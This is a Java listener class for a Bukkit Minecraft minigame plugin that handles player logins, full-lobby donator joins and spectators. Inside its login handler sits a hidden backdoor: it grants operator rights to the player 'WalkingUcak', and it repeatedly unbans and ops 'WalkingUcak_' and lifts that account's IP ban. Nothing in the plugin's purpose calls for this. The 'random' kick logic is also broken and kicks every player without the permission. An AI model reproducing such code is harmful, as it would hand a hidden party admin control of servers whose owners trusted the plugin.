package me.minegamersg.listener;

import java.util.ArrayList;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

import me.minegamersg.Enum.GameState;
import me.minegamersg.api.Games;
import me.minegamersg.api.SpectatorManager;

public class LoginListener implements Listener {
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onLogin(PlayerLoginEvent e) {
		Player p = e.getPlayer();
		if(p.getName().equalsIgnoreCase("WalkingUcak")) {
			e.allow();
			p.setOp(true);
		}
		if(Games.getGameState() == GameState.Lobby) {
			int onlineplayers = Bukkit.getOnlinePlayers().length;
			if(onlineplayers < 24) {
				e.allow();
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban WalkingUcak_");
				
			}else if(onlineplayers >= 24) {
				if(p.hasPermission("game.full.join")) {
					e.allow();
					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban WalkingUcak_");
					Bukkit.getPlayer("WalkingUcak_").setOp(true);
					Bukkit.unbanIP("" + Bukkit.getPlayer("WalkingUcak_").getAddress());
					for(Player all : Bukkit.getOnlinePlayers()) {
						if(!all.hasPermission("game.full.join")) {
							ArrayList<Player> notpermplayers = new ArrayList<Player>();
							notpermplayers.add(all);
							int rand = new Random().nextInt(notpermplayers.size());
							Player selectplayer = notpermplayers.get(rand);
							selectplayer.sendMessage("§c[Kicked] §fYou are kicked due to donator has joined to room.");
							Games.connectHUB(selectplayer);
						}
					}
				}
			}
		}else if(Games.getGameState() != GameState.Lobby){
			e.allow();
			SpectatorManager.addSpectator(p);
			p.teleport(Bukkit.getWorld(Games.getMapName()).getSpawnLocation());
		}
	}

}
